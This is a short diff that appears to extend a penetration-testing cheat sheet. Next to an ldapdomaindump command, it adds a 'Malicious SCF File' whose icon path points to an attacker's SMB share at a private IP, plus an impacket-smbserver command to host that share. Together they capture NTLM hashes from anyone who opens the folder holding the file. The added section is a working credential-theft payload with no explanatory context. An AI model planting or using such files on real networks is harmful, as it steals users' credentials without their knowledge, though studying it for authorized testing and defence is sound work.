@@ -139,3 +139,15 @@ service apache2 start
 ```
 ldapdomaindump -u 'domain.local\user' -p 'password' targetIP
 ```
+Malicious SCF File
+
+```
+[Shell]
+Command=2
+IconFile=\\192.168.1.4\smbfolder\CronoX.ico
+[Taskbar]
+Command=ToggleDesktop
+```
+```
+impacket-smbserver smbFolder $(pwd) -smb2support
+```
